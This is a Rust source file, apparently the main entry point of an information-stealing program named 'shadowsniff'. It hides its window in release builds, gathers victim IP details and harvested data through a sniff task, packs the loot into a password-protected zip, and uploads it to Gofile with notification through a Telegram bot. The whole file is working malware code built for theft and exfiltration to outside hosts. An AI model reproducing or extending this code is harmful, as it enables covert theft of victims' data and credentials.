#![no_main]
#![no_std]
#![cfg_attr(debug_assertions, windows_subsystem = "console")]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::atomic::AtomicCollector;
use collector::DisplayCollector;
use filesystem::path::Path;
use filesystem::virtualfs::VirtualFileSystem;
use filesystem::FileSystem;
use ipinfo::init_ip_info;
use rand_chacha::ChaCha20Rng;
use rand_core::RngCore;
use sender::gofile::Gofile;
use sender::telegram_bot::TelegramBot;
use sender::LogSender;
use shadowsniff::SniffTask;
use tasks::Task;
use utils::log_debug;
use utils::random::ChaCha20RngExt;
use zip::ZipArchive;

mod panic;

#[global_allocator]
static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;

#[unsafe(no_mangle)]
#[allow(unused_unsafe)]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    if !init_ip_info() {
        panic!()
    }

    let fs = VirtualFileSystem::default();
    let out = Path::new("\\output");
    // let _ = fs.remove_dir_all(out);
    let _ = fs.mkdir(&out);

    let collector = AtomicCollector::default();

    unsafe {
        SniffTask::default().run(&out, &fs, &collector);
    }

    let displayed_collector = format!("{}", DisplayCollector(&collector));

    log_debug!("{displayed_collector}");

    let password: String = {
        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
        let mut rng = ChaCha20Rng::from_nano_time();

        (0..10)
            .map(|_| {
                let idx = (rng.next_u32() as usize) % charset.len();
                charset[idx]
            })
            .collect()
    };

    let zip = ZipArchive::default()
        .add_folder_content(&fs, out)
        .password(&password)
        .comment(displayed_collector)
        .create();

    // let out = Path::new("output.zip");
    // let _ = StorageFileSystem.write_file(&out, &zip);

    let telegram = TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")));

    Gofile::new(telegram)
        .send(zip.into(), Some(password), &collector)
        .unwrap();

    0
}
